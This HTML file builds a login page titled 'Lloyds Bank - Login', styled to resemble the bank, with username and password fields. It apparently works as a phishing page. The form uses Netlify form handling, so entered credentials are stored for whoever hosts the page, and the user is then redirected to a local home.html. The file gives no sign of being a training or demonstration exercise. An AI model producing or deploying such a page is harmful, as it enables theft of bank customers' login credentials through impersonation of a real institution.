<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Lloyds Bank - Login</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: Arial, sans-serif;
      }
      .login-container {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: rgba(255, 255, 255, 0.8);
        padding: 20px;
        border-radius: 8px;
        width: 300px;
      }
      .login-container h2 {
        text-align: center;
        color: #333;
      }
      .input-field {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
      }
      .submit-btn {
        width: 100%;
        padding: 10px;
        background-color: #006747;
        border: none;
        color: white;
        font-size: 16px;
        border-radius: 4px;
        cursor: pointer;
      }
      .submit-btn:hover {
        background-color: #004f35;
      }
      .background {
        background-image: url("loginformimg.jpg"); /* Placeholder image */
        background-size: cover;
        background-position: center;
        height: 50%;
        position: fixed;
        width: 50%;
      }
    </style>
  </head>
  <body>
    <div class="background"></div>

    <div class="login-container">
      <h2>Lloyds Bank Login</h2>
      <form name="login-form" action="home.html" method="POST" netlify>
        <input type="hidden" name="form-name" value="login-form" />
        <input
          type="text"
          name="username"
          class="input-field"
          placeholder="Username"
          required
        />
        <input
          type="password"
          name="password"
          class="input-field"
          placeholder="Password"
          required
        />
        <button type="submit" class="submit-btn">Login</button>
      </form>
    </div>
  </body>
</html>
